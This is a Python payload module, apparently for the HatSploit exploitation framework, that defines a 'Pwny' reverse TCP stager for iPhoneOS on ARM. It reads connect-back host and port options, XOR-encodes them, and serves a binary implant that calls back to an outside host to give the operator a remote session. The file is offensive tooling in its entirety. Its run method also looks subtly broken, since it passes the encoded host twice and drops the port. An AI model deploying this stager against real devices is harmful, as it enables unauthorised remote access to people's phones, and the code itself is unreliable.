#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.lib.config import Config

from hatsploit.utils.string import StringTools
from hatsploit.utils.tcp import TCPClient

from hatsploit.external.pwny.session import HatSploitSession


class HatSploitPayload(Payload, StringTools):
    config = Config()

    details = {
        'Category': "stager",
        'Name': "iPhoneOS armle Pwny Reverse TCP",
        'Payload': "iphoneos/armle/pwny_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Pwny reverse TCP payload for iPhoneOS armle.",
        'Comments': [
            ''
        ],
        'Architecture': "armle",
        'Platform': "iphoneos",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    payload = {
        'Session': HatSploitSession,
        'Args': "{} {}"
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        self.payload.update({
            'Args': self.payload['Args'].format(
                self.xor_string(connback_host),
                self.xor_string(connback_host)
            )
        })

        return open(
            self.config.path_config['data_path'] + 'pwny/pwny.armle', 'rb'
        ).read()
